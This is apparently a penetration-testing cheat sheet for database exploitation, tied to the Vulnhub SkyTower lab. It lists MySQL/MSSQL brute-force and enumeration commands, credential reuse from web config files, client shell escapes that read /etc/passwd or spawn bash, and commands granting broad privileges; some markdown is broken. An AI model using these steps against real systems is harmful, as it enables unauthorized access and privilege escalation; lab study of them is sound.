# Exploit

## Brute Force

```text
msf > use auxiliary/admin/mssql/mssql_enum
```

```text
mysql --host=[IP] -u [root] -p
```

* Then enter the password in the CLI prompt.

## Re-use Credentials \(Vulnhub:SkyTower\)

Look at the webserver configuration files and /var/www/ files to see if there is a username and password in them for the DB.

## After Initial Access Is Gained

* Note that if you are entering in SQL commands to the database and are not getting any responses \(errors or expected results\), then you will likely have to enter in \q after entering the command to close out the session to get the SQL database to return results.  Example is below.

  \`\`\`

  $ mysql -u root -p

  Enter password: root

  USE SkyTech

  show tables;

\q Tables\_in\_SkyTech login

```text
### Re-enumerate
```

> show databases; show schemas;
>
> ```text
>   - You can then set the current working database with: > USE [database]; this needs to happen to interact with and display contents of tables within the database.
> ```
>
> show tables; show columns from \[table\]; SELECT \* FROM \[table\]; \`\`\`

### Attempt Shell

```text
> \! cat /etc/passwd 
> \! bash
```

### Attempt Privelege Escalation

#### Current Level Access

```text
>select user(); 
>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

#### Create New User and Grant Privleges

```text
>create user test identified by 'test'; 
> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

